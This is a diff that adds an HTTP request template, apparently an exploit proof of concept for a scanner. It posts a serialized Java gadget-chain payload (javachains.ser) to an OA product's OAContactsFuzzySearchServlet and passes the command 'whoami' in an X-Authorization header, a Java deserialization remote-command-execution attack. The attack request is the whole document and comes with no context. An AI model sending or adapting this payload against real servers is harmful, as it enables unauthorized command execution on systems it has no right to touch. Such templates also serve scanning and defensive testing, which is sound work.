@@ -1,0 +1,7 @@
+POST /servlet/OAContactsFuzzySearchServlet?pageId=login HTTP/1.1
+Host: 
+Content-Type: application/x-java-serialized-object
+X-Authorization: whoami
+
+{{file(/xxx/javachains.ser)}}
+
